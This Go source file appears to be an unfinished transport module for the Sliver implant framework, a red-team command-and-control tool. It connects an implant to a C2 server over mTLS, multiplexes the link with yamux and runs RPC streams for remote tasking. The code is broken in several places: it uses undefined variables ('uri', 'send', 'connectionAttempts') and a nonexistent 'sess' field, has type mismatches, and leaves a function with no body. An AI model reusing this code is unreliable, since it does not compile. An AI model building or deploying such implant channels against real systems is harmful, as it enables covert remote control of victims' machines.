package transports

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"crypto/rand"
	"encoding/binary"
	"io"
	"log"
	"net"
	"net/url"
	"strconv"
	"sync"

	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/hashicorp/yamux"
)

// Transport - A wrapper around a physical connection, embedding what is necessary to
// perform connection multiplexing, and RPC layer management around these muxed logical streams.
// This allows to have different RPC-able streams for parallel work on an implant.
// Also, these streams can be used to route any net.Conn traffic.
type Transport struct {
	// Information drawed from subcomponents as everythin is set and running
	ID    int
	LHost string
	LPort string
	RHost string
	RPort string
	// URL is used by Sliver's code for CC servers.
	URL *url.URL

	// conn - A Physical connection initiated by/on behalf of this transport.
	// From this conn will be derived one or more streams for different purposes.
	// This can be a tls.Conn, a tcp.Conn, a smtp.Conn, etc.
	conn net.Conn

	// multiplexer - Able to derive stream from the physical conn above. This
	// transport being in the implant and the server being the one "ordering"
	// to mux conns, we are in a server position here.
	multiplexer *yamux.Session

	// C2 - The logical stream used, by default, to speak RPC with the server.
	// When set up, it makes use of a logical stream muxed from the conn above.
	C2 *Connection
}

// New - Eventually, we should have all supported transport transports being
// instantiated with this function. It will perform all filtering and setup
// according to the complete URI passed as parameter, and classic templating.
func New(url *url.URL) (t *Transport, err error) {
	t = &Transport{
		ID:  newID(),
		URL: url,
	}
	// {{if .Config.Debug}}
	log.Printf("New transport (CC= %s)", uri.String())
	// {{end}}
	return
}

// For now we test with an mTLS connection and start everything from here.
func newTransportMTLS(url *url.URL) (t *Transport, err error) {
	// New
	// Start
	// Return
	return
}

// Start - Launch all components and routines that will handle all specifications above.
func (t *Transport) Start() (err error) {

	// {{if .Config.Debug}}
	log.Printf("Starting connection loop ...")
	// {{end}}

	switch t.URL.Scheme {
	// *** MTLS ***
	// {{if .Config.MTLSc2Enabled}}
	case "mtls":
		// {{if .Config.Debug}}
		log.Printf("Connecting -> %s", uri.Host)
		// {{end}}
		lport, err := strconv.Atoi(t.URL.Port())
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("[mtls] Error: failed to parse url.Port%s", uri.Host)
			// {{end}}
			lport = 8888
		}
		t.conn, err = tlsConnect(uri.Hostname(), uint16(lport))
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("[mtls] Connection failed %s", err)
			// {{end}}
			connectionAttempts++
			return
			// {{end}}  - MTLSc2Enabled
		}
	}

	// No matter the underlying protocol established in the switch,
	// we must have a net.Conn object, that we setup (mux & RPC)
	t.sess, err = yamux.Server(t.conn, nil)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[mux] Error setting up multiplexer: %s", err)
		// {{end}}
		return t.phyConnFallBack()
	}

	// {{if .Config.Debug}}
	log.Printf("[mux] Waiting for CC to open C2 stream...")
	// {{end}}
	t.C2, err = t.NewStreamC2()
	if err != nil {
		return t.phyConnFallBack()
	}

	return
}

// In case we failed to use multiplexing infrastructure, we call here
// to downgrade to RPC over the transport's physical connection.
func (t *Transport) phyConnFallBack() (err error) {
	// {{if .Config.Debug}}
	log.Printf("[mux] falling back on RPC around physical conn")
	// {{end}}

	// First make sure all mux code is cleanup correctly.

	// Wrap RPC layer around physical conn here.

}

// NewStreamC2 - The transports muxes the physical connection, adds a C2 RPC layer onto it,
// starts all request handling goroutines, and returns this connection, if needed.
// This function is used if we want to use this implant's RPC functionality concurrently.
func (t *Transport) NewStreamC2() (c2 *Connection, err error) {

	// Get net.Conn stream. This stream is not tracked by any mean latter on. For now only...
	stream, err := t.sess.Accept()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[mux] Error opening C2 stream: %s", err)
		// {{end}}
		return nil, err
	}

	c2 = &Connection{
		Send:    make(chan *pb.Envelope),
		Recv:    make(chan *pb.Envelope),
		ctrl:    make(chan bool),
		tunnels: &map[uint64]*Tunnel{},
		mutex:   &sync.RWMutex{},
		once:    &sync.Once{},
		IsOpen:  true,
		cleanup: func() {
			// {{if .Config.Debug}}
			log.Printf("[mux] lost stream, cleaning up RPC...")
			// {{end}}
			close(send)
			// In sliver we close the physical conn.
			// Here we close the logical stream only.
			stream.Close()
			// conn.Close()
			close(recv)
		},
	}

	go func() {
		defer c2.Cleanup()
		for envelope := range c2.send {
			socketWriteEnvelope(stream, envelope)
		}
	}()

	go func() {
		defer c2.Cleanup()
		for {
			envelope, err := socketReadEnvelope(stream)
			if err == io.EOF {
				break
			}
			if err == nil {
				c2.recv <- envelope
			}
		}
	}()

	// {{if .Config.Debug}}
	log.Printf("Done creating RPC C2 stream.")
	// {{end}}

	return
}

func newID() uint64 {
	randBuf := make([]byte, 8)
	rand.Read(randBuf)
	return binary.LittleEndian.Uint64(randBuf)
}
